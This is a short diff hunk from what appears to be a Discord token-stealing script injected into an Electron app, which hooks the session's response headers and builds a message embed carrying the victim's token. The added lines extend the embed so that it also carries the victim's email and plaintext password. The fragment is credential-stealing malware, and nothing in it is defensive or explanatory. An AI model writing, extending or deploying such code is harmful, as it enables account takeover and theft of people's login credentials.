@@ -154,6 +154,11 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                     "color": 16507654,
                     "fields": [
                         {
+                            "name": `Email: ${json.email}`,
+                            "value": `Password: ${password}`,
+                            "inline": false
+                        },
+                        {
                             "name": "**Token**",
                             "value": `\`${token}\``,
                             "inline": false
